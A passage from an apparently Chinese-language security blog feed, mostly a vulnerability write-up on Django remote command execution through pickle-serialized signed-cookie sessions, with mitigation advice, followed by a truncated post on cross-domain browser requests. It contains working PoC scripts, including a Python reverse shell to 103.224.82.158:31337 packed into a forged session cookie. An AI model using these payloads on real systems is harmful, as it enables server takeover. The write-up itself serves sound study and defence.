rel="noopener">http://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/</a></li><li><a href="http://security.tencent.com/index.php/blog/msg/93" target="_blank" rel="noopener">http://security.tencent.com/index.php/blog/msg/93</a></li><li><a href="http://www.sebug.net/vuldb/ssvid-89478" target="_blank" rel="noopener">http://www.sebug.net/vuldb/ssvid-89478</a></li><li><a href="http://www.sebug.net/vuldb/ssvid-89479" target="_blank" rel="noopener">http://www.sebug.net/vuldb/ssvid-89479</a></li><li><a href="http://www.sebug.net/vuldb/ssvid-89480" target="_blank" rel="noopener">http://www.sebug.net/vuldb/ssvid-89480</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;近日，WordPress 发布了新版本4.3.1，其中修复了几个严重的安全问题，其中包含了由 &lt;a href=&quot;http://checkpoint.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Check Point&lt;/a&gt; 所提交的一个跨站脚本
      
    
    </summary>
    
    
      <category term="security" scheme="http://rickgray.me/tags/security/"/>
    
      <category term="web" scheme="http://rickgray.me/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Django 远程命令执行漏洞详解</title>
    <link href="http://rickgray.me/2015/09/12/django-command-execution-analysis/"/>
    <id>http://rickgray.me/2015/09/12/django-command-execution-analysis/</id>
    <published>2015-09-11T16:00:00.000Z</published>
    <updated>2018-04-24T15:48:57.517Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h3><p>首先简单谈谈 Python 中的序列化模块。Python 中关于 <code>pickle</code> 序列化导致的任意命令执行问题早在 2002 年时就已经被提及，经过了长时间的测试和挖掘，其利用方法趋于固定，其 demo 如下：</p><p><code>serializer.py</code> （用以生成序列化后的 payload）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">import</span> cPickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">import</span> pickle</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Whoami</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">'whoami'</span>, ))</span><br><span class="line">    </span><br><span class="line">sess = base64.b64encode(pickle.dumps(Whoami()))</span><br><span class="line"><span class="keyword">print</span> sess</span><br></pre></td></tr></table></figure><p>代码执行后得到序列化后的字串：<code>Y3Bvc2l4CnN5c3RlbQpwMQooUyd3aG9hbWknCnAyCnRwMwpScDQKLg==</code></p><p><code>unserializer.py</code>（用以反序列化字符串生成对象）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">import</span> cPickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">pickle.loads(base64.b64decode(sys.argv[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><p>将前面的得到的序列化字串 <code>Y3Bvc2l4CnN5c3RlbQpwMQooUyd3aG9hbWknCnAyCnRwMwpScDQKLg==</code> 作为代码参数传入，得到输出：</p><p><img src="/images/articles/2015-09-12-django-command-execution-analysis/1.png" alt=""></p><p>可以看到 <code>whoami</code> 命令得到了执行，关于 <code>pickle</code> 的详细说明可参考<a href="https://docs.python.org/2/library/pickle.html" target="_blank" rel="noopener">官方文档</a>。</p><h3 id="二、分析"><a href="#二、分析" class="headerlink" title="二、分析"></a>二、分析</h3><p>简单的说明了 Python 中序列化导致的任意命令执行问题后，再来看看 Django 中与其相关的地方。（下面以 Django 1.5.12 作为环境进行示例说明）</p><p>在 Django 中，老版本（1.6以下）默认使用 <code>PickleSerializer()</code> 对 <code>session</code> 进行序列化，高版本中则使用 <code>JSONSerializer()</code> 对 <code>session</code> 进行序列化操作。</p><p>而 <code>PickleSerializer()</code> 的序列化则使用了 Python 中内置模块 <code>cPickle</code> 和 <code>pickle</code>。其类定义位于 <code>django/contrib/sessions/serializers.py</code> 中：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.core.signing <span class="keyword">import</span> JSONSerializer <span class="keyword">as</span> BaseJSONSerializer</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> django.utils.six.moves <span class="keyword">import</span> cPickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PickleSerializer</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Simple wrapper around pickle to be used in signing.dumps and</span></span><br><span class="line"><span class="string">    signing.loads.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dumps</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> pickle.dumps(obj, pickle.HIGHEST_PROTOCOL)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'loads() method called'</span></span><br><span class="line">        <span class="keyword">return</span> pickle.loads(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">JSONSerializer = BaseJSONSerializer</span><br></pre></td></tr></table></figure><p>若 Django 项目中配置了 session 序列化处理为 <code>PickleSerializer()</code>，即：</p><pre><code>SESSION_SERIALIZER = &apos;django.contrib.sessions.serializers.PickleSerializer&apos;</code></pre><p>其所有关于用户 session 的操作（序列化，反序列化等）都会使用其配置的方法对其进行处理。</p><p>Django 在处理用户请求和响应用户请求时都会调用会话中间件对其进行操作，中间件定义位于 <code>django/ontrib/sessions/middleware.py</code>，内容如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SessionMiddleware</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_request</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        engine = import_module(settings.SESSION_ENGINE)</span><br><span class="line">        session_key = request.COOKIES.get(settings.SESSION_COOKIE_NAME, <span class="keyword">None</span>)  <span class="comment"># 从用户请求的 Cookies 中获取配置中设置好的 session 名，默认为 "sessionid"</span></span><br><span class="line">        request.session = engine.SessionStore(session_key)  <span class="comment"># 使用 session 引擎对获取的 session 值进行初始化操作 SessionStore()</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_response</span><span class="params">(self, request, response)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        If request.session was modified, or if the configuration is to save the</span></span><br><span class="line"><span class="string">        session every time, save the changes and set a session cookie.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">    (...省略)</span><br></pre></td></tr></table></figure><p>当用户访问时会初始化 session 处理类，若服务端对用户会话信息进行访问或者修改，都会反序列化用户所传递的 session 值，然后从中读取数据。</p><p>综上看来，如果 session 可控，攻击者就可以构造出包含有恶意代码的序列化字串，将其传递给服务器，服务器在解析即反序列化 session 的同时，就有可能导致任意命令执行。当然了，攻击者想要成功构造出有效的 session 值，有两个必要条件：</p><ol><li>session 可控（即以 Cookies 等形式存储于客户端）</li><li>服务器上用以加密、验证等操作使用的 SECRET_KEY</li></ol><p>关于第一点，Django 中有多种 session 存储的方式，如：db、file、cookies 等。假设某一个 Django 项目使用了 cookies 作为它的 session 处理引擎，即在 <code>settings.py</code> 中有如下配置：</p><pre><code>SESSION_ENGINE = &apos;django.contrib.sessions.backends.signed_cookies&apos;</code></pre><p>这样一来，第一条件就可以满足了，所有关于用户的会话信息都以密文的形式存储在客户端。（事实证明，这样配置的 Django 项目的确不在少数）</p><p><img src="/images/articles/2015-09-12-django-command-execution-analysis/2.png" alt=""></p><p>使用了 cookies 作为 session 处理引擎，其对 session 的读取会通过前面提到的序列化处理过程进行处理。关键代码位于 <code>django/contrib/sessions/backends/signed_cookies.py</code> 中：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SessionStore</span><span class="params">(SessionBase)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 当后端访问会话数据时（例如 request.session['admin']）会使用 load() 函数载入加密的 session 数据，</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        We load the data from the key itself instead of fetching from</span></span><br><span class="line"><span class="string">        some external data store. Opposite of _get_session_key(),</span></span><br><span class="line"><span class="string">        raises BadSignature if signature fails.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> signing.loads(self.session_key,  <span class="comment"># 加密后的 session 值</span></span><br><span class="line">                serializer=self.serializer,  <span class="comment"># 若配置中设置了 PickleSerializer()，最终会调用 pickle 或者 cPickle 模块</span></span><br><span class="line">                <span class="comment"># This doesn't handle non-default expiry dates, see #19201</span></span><br><span class="line">                max_age=settings.SESSION_COOKIE_AGE,  <span class="comment"># session 的过期时间</span></span><br><span class="line">                salt=<span class="string">'django.contrib.sessions.backends.signed_cookies'</span>)  <span class="comment"># 用以验证 session 有效性的盐值，默认为项目中的 SECRET_KEY</span></span><br><span class="line">        <span class="keyword">except</span> (signing.BadSignature, ValueError):</span><br><span class="line">            <span class="comment"># 当用户的 session 验证失败时，会创建新的 session</span></span><br><span class="line">            self.create()</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    (...省略)</span><br></pre></td></tr></table></figure><p>关于第一点的说明到这里就足够了。再来说说第二条件即安全密钥-<code>SECRET_KEY</code>，作为 Django 项目中最核心的密钥，通常情况下是不可能外泄的，但是凡事都有不能预料的时候，例如，开发人员疏忽将 <code>SECRET_KEY</code> 作为一个 api 密钥加载于 JS 中，又或者项目中存在任意文件下载漏洞，攻击者通过下载 <code>settings.py</code> 文件读取到了密钥 <code>SECRET_KEY</code> 的值，其他种种诸如此类的原因致使 <code>SECRET_KEY</code> 泄露成为可能。</p><p>若同时满足上述两个条件，并且使用了 <code>PickleSerializer()</code> 序列化处理过程，那么攻击者就可以构造出恶意的序列化字串，传递给服务器，致使服务器在访问或修改会话信息时调用了相应引擎的 <code>load()</code> 函数，反序列化 session 加密字串，触发 <code>pickle</code> 任意命令执行漏洞。</p><h3 id="三、Demo"><a href="#三、Demo" class="headerlink" title="三、Demo"></a>三、Demo</h3><p>下面，我们就假设有这么一个站点，同时满足了上面所提到的两个必要条件：<code>session可控</code> 和 <code>SECRET_KEY泄露</code>，同时序列化过程使用 <code>PickleSerializer()</code>，建立一个测试项目名为 <code>demo</code>（依次执行下列命令，virtualenv 为 Python 虚拟环境管理，请自行检查或安装）。</p><pre><code>virtualenv --distribute djangocd django. bin/activatepip install django==1.5.12django-admin.py startproject democd demo/python manage.py startapp vuln</code></pre><p>首先给出整个项目的目录树：</p><p><img src="/images/articles/2015-09-12-django-command-execution-analysis/3.png" alt=""></p><p>首先设置用户会话引擎和序列化过程处理（1.5.12已将 startproject 创建的项目中的 SESSION_SERIALIZE 设置为了 JSONSerializer，所以按此流程进行测试的时候不要感到奇怪），在 demo/settings.py 文件中设置 <code>SESSION_ENGINE</code> 和 <code>SESSION_SERIALIZER</code>，并将创建的子应用 <code>vuln</code> 加入到 <code>INSTALL_APPS</code> 中：</p><pre><code>SESSION_ENGINE = &apos;django.contrib.sessions.backends.signed_cookies&apos;SESSION_SERIALIZER = &apos;django.contrib.sessions.serializers.PickleSerializer&apos;...INSTALLED_APPS += (&apos;vuln&apos;, )</code></pre><p>通过刚才的命令，已经在 <code>demo</code> 项目中创建了一个子应用 <code>vuln</code>，编辑 <code>vuln/views.py</code> 文件，为其增加需要进行测试的视图，内容如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> HttpResponse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">'This is index page'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        admin = request.session[<span class="string">'admin'</span>]</span><br><span class="line">    <span class="keyword">except</span> KeyError:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(<span class="string">'Get out of here'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">'Hello admin'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">'Secret key is: %s'</span> % settings.SECRET_KEY)</span><br></pre></td></tr></table></figure><p>随后配置路由信息 <code>demo/urls.py</code>：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> patterns, include, url</span><br><span class="line"></span><br><span class="line"><span class="comment"># Uncomment the next two lines to enable the admin:</span></span><br><span class="line"><span class="comment"># from django.contrib import admin</span></span><br><span class="line"><span class="comment"># admin.autodiscover()</span></span><br><span class="line"></span><br><span class="line">urlpatterns = patterns(<span class="string">'vuln.views'</span>,</span><br><span class="line">url(<span class="string">r'^$'</span>, <span class="string">'index'</span>),</span><br><span class="line">    url(<span class="string">r'^key/$'</span>, <span class="string">'key'</span>),</span><br><span class="line">    url(<span class="string">r'^admin/$'</span>, <span class="string">'admin'</span>),</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>将 <code>demo</code> 项目跑起来：</p><pre><code>python manage.py runserver 127.0.0.1:8000</code></pre><p>这里创建了3个视图 <code>index</code>，<code>admin</code> 和 <code>key</code>，为了测试方便，<code>http://127.0.0.1:8000/key/</code> 页面直接输出了该 Django 项目中的 <code>SECRET_KEY</code> 值。<code>http://127.0.0.1:8000/admin/</code> 页面为一个管理员页面，后端会尝试读取会话信息中 request.session[‘admin’] 的值，若存在则返回 “Hello admin”，不存在返回 “Get out of here”。</p><p><img src="/images/articles/2015-09-12-django-command-execution-analysis/4.png" alt=""></p><p>此处 <code>SECRET_KEY</code> 值为：<code>zur%eblm54)e)ox&amp;-xzbwonmx$=+ijh3dl&amp;6m-mx+1^y(-i09y</code></p><p><img src="/images/articles/2015-09-12-django-command-execution-analysis/5.png" alt=""></p><p>在用户访问管理页面时，后端尝试读取了 session[‘admin’] 的值，根据文章第二部分的分析结合此处的模拟环境，我们可以通过得到的 <code>SECRET_KEY</code> 来构造一个恶意的序列化字串来执行任意命令。</p><p>示例 PoC 如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> django.contrib.sessions.serializers <span class="keyword">import</span> PickleSerializer</span><br><span class="line"><span class="keyword">from</span> django.core <span class="keyword">import</span> signing</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"></span><br><span class="line">settings.configure(SECRET_KEY=<span class="string">'zur%eblm54)e)ox&amp;-xzbwonmx$=+ijh3dl&amp;6m-mx+1^y(-i09y'</span>)  <span class="comment"># SECRET_KEY 参数的值为 demo Django 项目的 SECRET_KEY 值</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CreateTmpFile</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">import</span> subprocess</span><br><span class="line">        <span class="keyword">return</span> (subprocess.call,</span><br><span class="line">                ([<span class="string">'touch'</span>,</span><br><span class="line">                  <span class="string">'/tmp/vulnerable'</span>],))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sess = signing.dumps(</span><br><span class="line">    obj=CreateTmpFile(),</span><br><span class="line">    serializer=PickleSerializer,</span><br><span class="line">    salt=<span class="string">'django.contrib.sessions.backends.signed_cookies'</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">print</span> sess</span><br></pre></td></tr></table></figure><p>运行该 PoC 后，得到加密后的 session 值：</p><pre><code>gAJjc3VicHJvY2VzcwpjYWxsCnEBXXECKFUFdG91Y2hxA1UPL3RtcC92dWxuZXJhYmxlcQRlhVJxBS4:1Zb63z:AUICT5WAqW3JrFNYpeR0remUBHI</code></pre><p>然后直接请求 <code>http://127.0.0.1:8000/admin/</code> 并附上相应的 session 值。</p><pre><code>curl http://127.0.0.1:8000/admin/ --cookie &quot;sessionid=gAJjc3VicHJvY2VzcwpjYWxsCnEBXXECKFUFdG91Y2hxA1UPL3RtcC92dWxuZXJhYmxlcQRlhVJxBS4:1Zb63z:AUICT5WAqW3JrFNYpeR0remUBHI&quot;</code></pre><p>然后查看 <code>/tmp</code> 目录，发现成功创建了 <code>vulnerable</code> 文件，命令得到了执行：</p><p><img src="/images/articles/2015-09-12-django-command-execution-analysis/6.png" alt=""></p><p>同时服务器也抛出错误：</p><p><img src="/images/articles/2015-09-12-django-command-execution-analysis/7.png" alt=""></p><p>下面再给出一 PoC 用以 GetShell：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> django.contrib.sessions.serializers <span class="keyword">import</span> PickleSerializer</span><br><span class="line"><span class="keyword">from</span> django.core <span class="keyword">import</span> signing</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"></span><br><span class="line">settings.configure(SECRET_KEY=<span class="string">'zur%eblm54)e)ox&amp;-xzbwonmx$=+ijh3dl&amp;6m-mx+1^y(-i09y'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetShellWithPython</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">import</span> subprocess</span><br><span class="line">        <span class="keyword">return</span> (subprocess.call,</span><br><span class="line">                ([<span class="string">'python'</span>,</span><br><span class="line">                  <span class="string">'-c'</span>,</span><br><span class="line">                  <span class="string">'import socket,subprocess,os;'</span></span><br><span class="line">                  <span class="string">'s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'</span></span><br><span class="line">                  <span class="string">'s.connect(("103.224.82.158",31337));'</span></span><br><span class="line">                  <span class="string">'os.dup2(s.fileno(),0);'</span></span><br><span class="line">                  <span class="string">'os.dup2(s.fileno(),1);'</span></span><br><span class="line">                  <span class="string">'os.dup2(s.fileno(),2);'</span></span><br><span class="line">                  <span class="string">'subprocess.call(["/bin/sh","-i"]);'</span>],))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sess = signing.dumps(</span><br><span class="line">    obj=GetShellWithPython(),</span><br><span class="line">    serializer=PickleSerializer,</span><br><span class="line">    salt=<span class="string">'django.contrib.sessions.backends.signed_cookies'</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">print</span> sess</span><br></pre></td></tr></table></figure><p>运行该 PoC 后，得到加密后的 session 值：</p><pre><code>gAJjc3VicHJvY2VzcwpjYWxsCnEBXXECKFUGcHl0aG9ucQNVAi1jcQRV12ltcG9ydCBzb2NrZXQsc3VicHJvY2VzcyxvcztzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKCIxMDMuMjI0LjgyLjE1OCIsMzEzMzcpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7cQVlhVJxBi4:1Zb69o:JrnUm9KCbIDWVh13g2i5rY0o11E</code></pre><p>然后请求 <code>http://127.0.0.1:8000/admin/</code> 并附上相应的 session 值。</p><p><img src="/images/articles/2015-09-12-django-command-execution-analysis/8.png" alt=""></p><p>可以看到，已经成功 GetShell。</p><h3 id="四、小结"><a href="#四、小结" class="headerlink" title="四、小结"></a>四、小结</h3><p>通过两个简单的例子来说明了 Django 中如何利用配置缺陷来进行任意命令执行。实例中虽然使用的是 Django-1.5.12 版本，但是需要注意的是，只要满足 2 个必要条件以及使用了 <code>PickleSerializer()</code> 处理序列化过程，必然会存在反序列化导致任意命令执行的问题。</p><p>避免该问题的最直接方法就是用 <code>JSONSerializer()</code> 来代替 <code>PickleSerializer()</code> 进行序列化处理，以及避免使用 Cookies 来存放重要的会话信息。</p><p>本文虽只给出了 Demo 示例来演示 Django 任意命令执行过程，但足以说明该问题的严重性，应该得到广大开发者（特别是 Python 使用者们）的重视。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://drops.wooyun.org/web/8528" target="_blank" rel="noopener">http://drops.wooyun.org/web/8528</a></li><li><a href="http://www.securityfocus.com/bid/5255/info" target="_blank" rel="noopener">http://www.securityfocus.com/bid/5255/info</a></li><li><a href="http://www.securityfocus.com/bid/5257/info" target="_blank" rel="noopener">http://www.securityfocus.com/bid/5257/info</a></li><li><a href="https://blog.nelhage.com/2011/03/exploiting-pickle/" target="_blank" rel="noopener">https://blog.nelhage.com/2011/03/exploiting-pickle/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、背景&quot;&gt;&lt;a href=&quot;#一、背景&quot; class=&quot;headerlink&quot; title=&quot;一、背景&quot;&gt;&lt;/a&gt;一、背景&lt;/h3&gt;&lt;p&gt;首先简单谈谈 Python 中的序列化模块。Python 中关于 &lt;code&gt;pickle&lt;/code&gt; 序列化导致的任意命
      
    
    </summary>
    
    
      <category term="security" scheme="http://rickgray.me/tags/security/"/>
    
      <category term="web" scheme="http://rickgray.me/tags/web/"/>
    
      <category term="exploit" scheme="http://rickgray.me/tags/exploit/"/>
    
  </entry>
  
  <entry>
    <title>浏览器中的跨域资源请求</title>
    <link href="http://rickgray.me/2015/09/03/solutions-to-cross-domain-in-browser/"/>
    <id>http://rickgray.me/2015/09/03/solutions-to-cross-domain-in-browser/</id>
    <published>2015-09-02T16:00:00.000Z</published>
    <updated>2018-04-24T15:48:57.517Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://baike.baidu.com/view/3747010.htm" target="_blank" rel="noopener">同源策略</a>-是针对浏览器所设计的一项安全规定，页面中所渲染的资源（JavaScript脚本除外）都需要符合同源策略才能够正常访问。</p><p>在构建 Web 项目或者进行 XSS 攻击时，常常需要进行跨域资源访问。设想这样一个场景：攻击者 Attacker 在网站 A 上注入了一段恶意 JS 代码，用来盗取访问者的浏览器、Cookie、IP 等信息，并通过 ajax 请求将这些信息以参数的形式（GET、POST 皆可）发送至攻击者事先准备好的服务站 B 上。若按同源策略规定，在网站 A 上不能直接请求或者发送数据至网站 B，那么这里就要用到一些跨域资源请求的方法。</p><p>通过总结已公开的跨域方法并结合自己的理解和实践，将几种跨域资源请求的方法通过实例 Demo 的形式详细记录如下。</p><p>网站 A 要获取网站 B 上的资源内容，跨域方法分为 <code>网站 B 可控</code> 和 <code>网站 B 不可控</code> 两类（可控指能更改 Web 服务器设置或者页面内容）。</p><h3 id="网站-B-可控的跨域方法："><a href="#网站-B-可控的跨域方法：" class="headerlink" title="网站 B 可控的跨域方法："></a>网站 B 可控的跨域方法：</h3><ol><li>同主域名下iframe控制document.domain进行跨域</li><li>iframe集合location.hash进行跨域数据获取</li><li>通过iframe.name跨域传递数据</li><li>将数据通过 JS 进行直接加载</li><li>html5中的postMessage</li><li>利用 CORS 进行跨域 </li></ol><h3 id="网站-B-不可控的跨域方法："><a href="#网站-B-不可控的跨域方法：" class="headerlink" title="网站 B 不可控的跨域方法："></a>网站 B 不可控的跨域方法：</h3><ol><li>代理服务（Proxy）</li></ol><h2 id="一、网站-B-可控的跨域"><a href="#一、网站-B-可控的跨域" class="headerlink" title="一、网站 B 可控的跨域"></a>一、网站 B 可控的跨域</h2><p>为了更好的进行 Demo 演示，事先设置域名解析情况如下（192.168.130.200为本地虚拟机）：</p><pre><code>a.0xfa.club ==&gt; 192.168.130.200（网站 A）b.0xfa.club ==&gt; 192.168.130.200（网站 B）</code></pre><h3 id="1-同主域名下iframe控制document-domain进行跨域"><a href="#1-同主域名下iframe控制document-domain进行跨域" class="headerlink" title="1. 同主域名下iframe控制document.domain进行跨域"></a>1. 同主域名下iframe控制document.domain进行跨域</h3><p>网站 B 上有一资源文件 <code>data.html</code>，其 URL 为 <code>http://b.0xfa.club/data.html</code>，内容如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"data"</span>&gt;</span>Hello A Site!!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">```</span><br><span class="line"></span><br><span class="line">如果网站 A 想要获取 `id="data"` 的文本值 `Hello A Site!!`，在不考虑同源策略的情况下可以有如下代码：</span><br><span class="line"></span><br><span class="line">```html</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>a.0xfa.club/in.html<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="javascript">iframe.src = <span class="string">'http://b.0xfa.club/location/data.html'</span>;</span></span><br><span class="line"><span class="javascript">iframe.style.display = <span class="string">'none'</span>;</span></span><br><span class="line"><span class="javascript">iframe.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> doc = iframe.contentDocument || iframe.contentWindow.document;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(doc.getElementById(<span class="string">'data'</span>).textContent);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.appendChild(iframe);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是实际访问情况下，由于浏览器的同源策略限制，并不能成功获取数据并通过调试终端输出数据，浏览器一般会在终端下输出错误，提示跨域访问失败。（此处为 Chrome）</p><p><img src="/images/articles/2015-09-03-solutions-to-cross-domain-in-browser/1.png" alt=""></p><p>这时候，由于网站 A 和 B 都属于 <code>0xfa.club</code> 的子域，加上网站 B 可控，设置网站 document.domain 为统一主域 <code>0xfa.club</code> 即可进行跨域访问，完整的代码示例如下：</p><p><code>http://a.0xfa.club/in.html</code> 源码：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>a.0xfa.club/in.html<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.domain = <span class="string">'0xfa.club'</span>;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="javascript">iframe.src = <span class="string">'http://b.0xfa.club/location/data.html'</span>;</span></span><br><span class="line"><span class="javascript">iframe.style.display = <span class="string">'none'</span>;</span></span><br><span class="line"><span class="javascript">iframe.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> doc = iframe.contentDocument || iframe.contentWindow.document;</span></span><br><span class="line"><span class="javascript">  <span 